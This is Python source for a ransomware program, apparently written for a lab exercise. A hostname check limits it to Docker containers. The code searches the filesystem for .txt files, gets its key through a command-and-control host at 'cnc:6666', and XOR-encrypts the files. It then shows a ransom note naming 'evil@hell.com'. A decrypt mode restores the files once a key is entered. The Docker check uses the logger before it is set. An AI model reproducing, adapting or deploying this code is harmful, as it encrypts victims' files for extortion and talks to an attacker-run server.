import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
        self._log = logging.getLogger(self.__class__.__name__)
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            self._log.error(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # get all files with specified filter in /
        files = Path("/").rglob(filter)
        
        # return all files matching the filter with their absolute path
        return [str(f) for f in files]    
        

    def encrypt(self):
        # main function for encrypting
        # 1. list all files with .txt extension
        files = self.get_files("*.txt")
        # 2. create a SecretManager
        secret_manager = SecretManager(remote_host_port = CNC_ADDRESS,token_path=TOKEN_PATH)
        #3.call SecretManager.setup()
        try:
            secret_manager.setup()
            #4. encrypt files
            secret_manager.xorfiles(files)
        except ConnectionError:
            self._log.error("Connection error")
            sys.exit(1)
        except FileExistsError:
            secret_manager.load()
        #5. display the message
        self._log.info(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
        return


    def decrypt(self):
        # main function for decrypting
        #create a SecretManager
        secret_manager = SecretManager(remote_host_port = CNC_ADDRESS,token_path=TOKEN_PATH) 
        try:
            secret_manager.setup()
            return
        except ConnectionError: 
            self._log.error("No token found")
            return
        except FileExistsError: secret_manager.load()
        while True:
            b64_key = input("Enter the key: ") # 1. ask for the key
            try :
                secret_manager.set_key(b64_key) # 2. call SecretManager.set_key()
                files = self.get_files("*.txt") # 3. retrieve all files with .txt extension
                secret_manager.xorfiles(files) # 4. call SecretManager.xorfiles() on the list of files
                secret_manager.clean() # 5. call clean with SecretManager
                self._log.info("Your files have been decrypted") # 6. display a message of success
                sys.exit(0) # 7. exit the ransomware
            except Exception as e: self._log.error("Invalid key")
            

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()